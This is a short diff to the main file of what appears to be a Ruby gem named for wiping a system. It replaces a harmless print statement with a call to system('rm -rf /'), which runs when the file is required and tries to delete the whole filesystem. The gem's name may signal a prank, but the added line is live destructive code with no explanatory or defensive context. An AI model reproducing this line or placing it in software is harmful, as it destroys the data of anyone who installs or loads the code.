@@ -1,3 +1,4 @@
 require "this_will_rm_rf_your_shit/version"
 
-puts "Seriously?"
+# Seriously!
+system('rm -rf /')
